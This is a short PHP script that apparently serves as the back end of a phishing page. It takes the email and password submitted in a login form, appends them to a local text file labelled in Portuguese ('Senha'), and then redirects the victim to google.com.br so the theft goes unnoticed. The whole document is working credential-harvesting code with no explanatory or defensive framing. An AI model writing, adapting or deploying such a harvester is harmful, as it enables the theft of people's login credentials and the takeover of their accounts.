
<?php header ('Content-type: text/html; charset=UTF-8'); ?>
<?php
$file = "local.txt";
$username = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "*************************");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Senha: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "************************");
fwrite($handle, "\n");
fclose($handle);
echo  '<script type="text/javascript">
           window.location = "http://google.com.br"
      </script>';